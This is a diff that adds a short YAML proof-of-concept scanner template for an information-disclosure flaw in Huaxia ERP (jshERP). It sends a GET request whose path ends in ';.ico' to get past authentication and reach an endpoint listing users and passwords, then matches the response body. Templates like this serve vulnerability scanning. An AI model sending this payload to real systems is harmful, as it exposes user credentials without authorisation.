@@ -1,0 +1,10 @@
+name: poc-yaml-华夏ERP-Sensitive-information
+description: "用户名和密码敏感漏洞"
+method: GET
+path:
+  -  "/jshERP-boot/user/getAllList;.ico"
+expression:
+  status: 200
+  body_any:
+    - "userList"
+    - "code"
